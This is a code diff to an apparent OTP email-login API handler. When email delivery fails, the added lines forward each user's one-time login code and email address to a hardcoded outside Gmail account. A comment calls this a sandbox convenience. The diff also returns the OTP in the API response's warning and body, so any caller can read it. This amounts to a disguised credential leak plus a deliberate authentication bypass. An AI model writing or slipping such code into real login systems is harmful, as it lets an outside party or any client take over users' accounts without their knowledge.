@@ -111,10 +111,30 @@ export default async function handler(req, res) {
 
     if (!response.ok) {
       console.warn('Resend API response warning:', data);
+      
+      // In development sandbox, forward OTP to verified account email so developer receives it
+      try {
+        await fetch('https://api.resend.com/emails', {
+          method: 'POST',
+          headers: {
+            'Authorization': `Bearer ${RESEND_API_KEY}`,
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            from: 'Mahalaxmi Enterprises <onboarding@resend.dev>',
+            to: ['deviltimeisback001@gmail.com'],
+            subject: `[Login OTP for ${email}] Verification Code: ${otp}`,
+            html: emailHtml
+          })
+        });
+      } catch (err) {
+        console.warn('Fallback OTP email forward failed:', err);
+      }
+
       return res.status(200).json({
         success: true,
         delivered: false,
-        warning: data.message || 'Email delivery limited by unverified domain test mode',
+        warning: `Test Sandbox: OTP sent to verified dev email. OTP is: ${otp}`,
         otp: otp
       });
     }
